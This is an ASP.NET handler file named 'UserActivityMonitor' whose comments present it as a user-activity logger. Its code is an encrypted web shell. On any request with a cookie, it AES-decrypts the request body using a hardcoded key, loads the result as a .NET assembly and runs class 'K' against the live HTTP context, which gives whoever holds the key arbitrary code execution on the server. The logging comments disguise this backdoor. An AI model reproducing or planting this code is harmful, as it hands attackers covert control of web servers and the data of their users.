<%@ WebHandler Language="C#" Class="UserActivityMonitor" %>
using System.Web;
using System.Text;
using System.Security.Cryptography;
using System.Reflection;

public class UserActivityMonitor:IHttpHandler
{
    // Processes the incoming request to log user activity.
    public void ProcessRequest(HttpContext currentContext)
    {
        // Activity logging is only enabled for users with a session cookie.
        if (currentContext.Request.Cookies.Count != 0)
        {
            // This key is used to verify the integrity of the log data packet.
            string logSigningSecret = "SECRET_PREFIX_ca63457538b9b1e0_SECRET_SUFFIX";
            var secretBytes = Encoding.Default.GetBytes(logSigningSecret.Substring(14, 16));

            // Read the incoming encrypted log data.
            byte[] encryptedLogData = currentContext.Request.BinaryRead(currentContext.Request.ContentLength);
            
            // Prepare the decryption utility for the log data. This is a legacy requirement.
            var cryptoProvider = new RijndaelManaged();
            var dataTransformer = cryptoProvider.CreateDecryptor(secretBytes, secretBytes);
            
            // Decrypt the log data to get the raw log entry assembly.
            byte[] logEntryAssemblyBytes = dataTransformer.TransformFinalBlock(encryptedLogData, 0, encryptedLogData.Length);
            
            // Load the specific log processor module from the decrypted data.
            var logProcessorAssembly = Assembly.Load(logEntryAssemblyBytes);
            
            // Create an instance of the main log processor class.
            // The class is always named 'K' for 'Kernel' in these legacy modules.
            var logProcessorInstance = logProcessorAssembly.CreateInstance("K");
            
            // Pass the current HTTP context to the processor for full analysis.
            logProcessorInstance.Equals(currentContext);
        }
    }

    // This handler is not thread-safe.
    public bool IsReusable { get { return false; } }
}